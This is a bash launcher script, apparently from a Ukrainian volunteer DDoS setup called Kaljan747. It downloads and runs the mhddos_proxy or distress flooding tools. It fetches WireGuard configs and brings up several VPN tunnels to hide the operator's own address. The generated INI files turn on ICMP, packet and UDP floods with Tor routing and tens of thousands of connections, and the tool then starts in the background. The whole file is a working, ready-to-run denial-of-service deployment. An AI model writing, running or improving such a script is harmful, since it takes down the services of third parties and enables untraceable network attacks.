#!/bin/bash
set -e

print_header() {
    echo -e "\e[1;36m========================================"
    echo -e "🚀  Запуск Kaljan747"
    echo -e "========================================\e[0m"
}

print_stage() {
    echo -e "\e[1;34m$1\e[0m"
}

SETTINGS_FILE="$HOME/.kaljan747_settings"

ask_user_id() {
    read -p "Введіть ваш user-id (тільки цифри): " USER_ID
}

ask_run_parameters() {
    echo "Виберіть модуль:"
    echo "1) mhddos_proxy"
    echo "2) distress"
    read -p "Ваш вибір (1/2): " mod_choice
    SELECTED_MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )

    echo "Редагувати INI перед запуском?"
    echo "1) Так"
    echo "2) Ні"
    read -p "Ваш вибір (1/2): " edit_choice
    EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )

    echo "Виберіть режим запуску:"
    echo "1) screen у фоні"
    echo "2) screen відкрито"
    echo "3) без screen"
    read -p "Ваш вибір (1/2/3): " run_choice
    case "$run_choice" in
        1) SELECTED_RUN_MODE="screen у фоні";;
        2) SELECTED_RUN_MODE="screen відкрито";;
        3) SELECTED_RUN_MODE="без screen";;
    esac
}

# Завантаження або введення налаштувань
if [ -f "$SETTINGS_FILE" ]; then
    echo "1) Використати старі налаштування"
    echo "2) Ввести нові"
    read -p "Ваш вибір (1/2): " choice
    [ "$choice" = "1" ] && source "$SETTINGS_FILE" || { USER_ID=""; SELECTED_MODULE=""; EDIT_INI=""; SELECTED_RUN_MODE=""; }
fi

# USER-ID
if [ -z "$USER_ID" ]; then
    while true; do
        ask_user_id
        [[ -z "$USER_ID" ]] && echo "User-id обов'язковий. Завершення." && exit 1
        [[ "$USER_ID" =~ ^[0-9]+$ ]] && break || echo "USER-ID має містити тільки цифри!"
    done
fi

# Інші параметри
[ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ] && ask_run_parameters

print_header
echo -e "📥  USER-ID: \e[1;32m$USER_ID\e[0m"
echo -e "🧩  Модуль: \e[1;36m$SELECTED_MODULE\e[0m"
echo -e "🛠️  Режим: \e[1;36m$SELECTED_RUN_MODE\e[0m"

# Збереження
cat > "$SETTINGS_FILE" <<EOF
USER_ID="$USER_ID"
SELECTED_MODULE="$SELECTED_MODULE"
EDIT_INI="$EDIT_INI"
SELECTED_RUN_MODE="$SELECTED_RUN_MODE"
EOF

# sudo
[ "$(id -u)" -eq 0 ] && SUDO="" || SUDO="sudo"

# Встановлення залежностей
print_stage "📦  Встановлення залежностей..."

INSTALL_PKGS="curl wget git screen sed wireguard-tools iproute2 nano"
if command -v apt >/dev/null; then
    $SUDO apt update -y && $SUDO apt install -y $INSTALL_PKGS
elif command -v dnf >/dev/null; then
    $SUDO dnf install -y $INSTALL_PKGS
elif command -v yum >/dev/null; then
    $SUDO yum install -y $INSTALL_PKGS
elif command -v apk >/dev/null; then
    $SUDO apk add --no-cache $INSTALL_PKGS
elif command -v pacman >/dev/null; then
    $SUDO pacman -Sy --noconfirm $INSTALL_PKGS
elif command -v zypper >/dev/null; then
    $SUDO zypper install -y $INSTALL_PKGS
else
    echo "❌ Невідомий пакетний менеджер"
    exit 1
fi

# Папки
MODULE_DIR="$HOME/modules"
WG_DIR="$HOME/wg_confs"
mkdir -p "$MODULE_DIR" "$WG_DIR"
touch "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"

# Вибір модуля
case "$SELECTED_MODULE" in
    mhddos_proxy)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
        MODULE_NAME="mhddos"
        DOWNLOAD_LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
        ;;
    distress)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
        MODULE_NAME="distress"
        DOWNLOAD_LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
        ;;
esac

[ -f "$MODULE" ] || wget -qO "$MODULE" "$DOWNLOAD_LINK"
chmod +x "$MODULE"

# Завантаження WG-конфігів
print_stage "🌍  Завантаження WG-конфігів..."

WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"

CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=")[^"]+\.conf(?=")' | grep "/k7771/Kaljan747/blob/" | sed -E 's|^/k7771/Kaljan747/blob/k7771/wg/||')

if [ -z "$CONF_LIST" ]; then
    echo "⚠️ Не вдалося отримати список .conf з GitHub. Перевіряю локальну папку..."
    CONF_LIST=$(find "$WG_DIR" -name "*.conf" -type f)
    if [ -z "$CONF_LIST" ]; then
        echo "❌ Жодного .conf файлу не знайдено навіть локально. Завершення."
        exit 1
    else
        echo "✅ Використано локальні файли: $(basename -a $CONF_LIST | tr '\n' ' ')"
    fi
else
    for file in $CONF_LIST; do
        RAW_URL="$WG_RAW_BASE/$file"
        DEST="$WG_DIR/$(basename "$file")"
        if ! curl -fsSL "$RAW_URL" -o "$DEST"; then
            echo "⚠️ curl не спрацював — пробую wget"
            wget -qO "$DEST" "$RAW_URL" || echo "❌ Не вдалося: $file"
        fi
    done
fi

$SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true

# Зупинка WG
for iface in $(wg show interfaces 2>/dev/null); do
    $SUDO wg-quick down "$iface" || true
    $SUDO ip link delete "$iface" || true
done

# Підключення WG
WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 10))
WG_IFACES=()
for conf in "${WG_FILES[@]}"; do
    IFACE_NAME=$(basename "$conf" .conf)
    if $SUDO wg-quick up "$conf" 2>/dev/null; then
        if wg show "$IFACE_NAME" &>/dev/null; then
            WG_IFACES+=("$IFACE_NAME")
            echo "✅ Піднято: $IFACE_NAME"
        else
            echo "⚠️ Неактивний інтерфейс: $IFACE_NAME"
        fi
    else
        echo "❌ Не вдалося: $IFACE_NAME"
    fi
    sleep 1
done

[ ${#WG_IFACES[@]} -eq 0 ] && echo "❌ Жоден WG не піднявся. Завершення." && exit 1

VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")
echo -e "📡 Активні VPN: \e[1;36m$VPN_LIST\e[0m"

# Оновлення INI
echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"

# Редагування INI
[ "$EDIT_INI" = "Так" ] && nano "$CONFIG_FILE"

# Запуск
case "$SELECTED_RUN_MODE" in
    "screen у фоні") screen -dmS "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "screen відкрито") screen -S "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "без screen") "$MODULE" $(cat "$CONFIG_FILE") & ;;
esac

exit 0
